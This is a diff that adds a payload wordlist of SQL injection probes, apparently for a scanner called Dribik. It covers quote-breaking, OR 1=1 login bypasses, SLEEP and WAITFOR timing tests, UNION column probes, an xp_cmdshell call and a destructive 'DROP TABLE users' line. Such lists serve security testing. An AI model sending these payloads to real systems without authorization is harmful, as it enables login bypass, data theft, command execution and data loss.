@@ -1,0 +1,46 @@
+# SQL Injection Payloads for Dribik
+# Error-based, boolean-blind, union, and time-based probes
+
+'
+''
+`
+"
+1' OR '1'='1
+1' OR '1'='1'--
+1 OR 1=1
+1' OR 1=1--
+1' OR '1'='1'/*
+1" OR "1"="1
+1 OR 1=1--
+' OR 1=1--
+' OR 'a'='a
+1' AND SLEEP(3)--
+1'; WAITFOR DELAY '0:0:3'--
+' OR SLEEP(3)--
+1 AND SLEEP(3)--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' ORDER BY 100--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+1' UNION SELECT 1,2,3--
+1'; SELECT * FROM information_schema.tables--
+' AND 1=1--
+' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+1' AND 1=1--
+1' AND 1=2--
+admin'--
+admin' #
+admin'/*
+' having 1=1--
+' group by 1--
+'; exec xp_cmdshell('ping 127.0.0.1')--
+1; DROP TABLE users--
+'OR 1=1#
+"OR 1=1#
+OR 1=1
